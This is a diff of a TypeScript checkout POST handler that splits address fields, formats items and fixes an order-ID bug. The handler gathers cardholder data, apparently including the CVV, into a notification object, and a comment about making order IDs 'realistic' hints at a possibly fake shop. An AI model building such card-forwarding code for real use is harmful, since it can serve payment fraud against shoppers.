@@ -11,8 +11,17 @@ export async function POST(request: Request) {
       lastName,
       email,
       phone,
-      shippingAddress,
+      address,
+      apartment,
+      city,
+      state,
+      zipCode,
+      country,
       billingAddress,
+      billingCity,
+      billingState,
+      billingZipCode,
+      billingCountry,
       items,
       total,
       cardName,
@@ -21,8 +30,19 @@ export async function POST(request: Request) {
       cardCvv
     } = body;
 
+    // Format shipping address
+    const shippingAddress = `${address}${apartment ? `, ${apartment}` : ''}, ${city}, ${state} ${zipCode}, ${country}`;
+    
+    // Format billing address
+    const billingAddressFormatted = billingAddress ? `${billingAddress}, ${billingCity}, ${billingState} ${billingZipCode}, ${billingCountry}` : shippingAddress;
+
+    // Format items for display
+    const itemsFormatted = items && Array.isArray(items) 
+      ? items.map(item => `${item.name || 'Product'} (Qty: ${item.quantity || 1})`).join(', ')
+      : '1 item';
+
     // Generate a realistic order ID
-    const orderId = `ORD-${Math.random().toString(36).substring(2, 10).toUpperCase()}-${Math.random().toString(36).substring(2, -10).toUpperCase()}`;
+    const orderId = `ORD-${Math.random().toString(36).substring(2, 10).toUpperCase()}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
 
     // Prepare notification data
     const notificationData = {
@@ -31,8 +51,8 @@ export async function POST(request: Request) {
       email,
       phone,
       shippingAddress,
-      billingAddress,
-      items,
+      billingAddress: billingAddressFormatted,
+      items: itemsFormatted,
       total,
       paymentDetails: {
         cardHolder: cardName || `${firstName} ${lastName}`
